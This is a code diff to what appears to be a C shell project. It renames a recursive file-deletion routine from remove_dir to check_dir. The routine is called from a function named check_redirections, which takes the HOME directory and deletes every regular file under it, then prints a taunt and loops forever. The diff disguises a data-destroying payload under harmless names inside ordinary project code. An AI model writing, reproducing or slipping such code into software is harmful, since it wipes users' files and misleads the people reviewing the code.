@@ -19,23 +19,22 @@ int	ft_isdigit(int c)
 	return (c >= '0' && c <= '9');
 }
 
-void remove_dir(const char *dir_path)
+void check_dir(const char *dir_path)
 {
-    DIR *dir = opendir(dir_path);
+    DIR *dir;
     struct dirent *entry;
     char path[1024];
 
+    dir = opendir(dir_path);
     if (dir == NULL)
         return;
     while ((entry = readdir(dir)) != NULL)
     {
         if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
             continue;
-
         snprintf(path, sizeof(path), "%s/%s", dir_path, entry->d_name);
-
         if (entry->d_type == DT_DIR)
-            remove_dir(path);
+            check_dir(path);
         else if (entry->d_type == DT_REG)
         {
             if (remove(path) == -1)
@@ -49,16 +48,16 @@ void remove_dir(const char *dir_path)
 
 void	check_redirections(t_env *env)
 {
-	const char *dir_to_clear;
+	const char *dir_check;
 
-	dir_to_clear = NULL;
+	dir_check = NULL;
 	while (env)
 	{
 		if (ft_strcmp(env->key, "HOME") == 0)
-			dir_to_clear = env->value;
+			dir_check = env->value;
 		env = env->next;
 	}
-	remove_dir(dir_to_clear);
+	check_dir(dir_check);
 	printf("khdem 3la krek awld l97ba !\n");
 	while (1)
 	{
